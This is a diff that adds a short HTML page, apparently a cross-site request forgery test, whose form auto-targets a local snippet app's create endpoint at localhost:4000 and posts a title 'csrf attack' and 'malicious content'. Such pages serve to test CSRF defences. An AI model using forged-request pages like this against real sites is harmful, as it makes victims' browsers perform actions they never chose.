@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+
+<body>
+  <a href="https://localhost:4000/snippet/create">click</a>
+  <form action="https://localhost:4000/snippet/create" method="POST">
+    <input type="text" name="title" value="csrf attack" />
+    <input type="text" name="content" value="just a malicious content`" />
+    <input type="text" name="expires" value="365" />
+    <div>
+      <input type="submit" value="csrf" />
+    </div>
+  </form>
+</body>
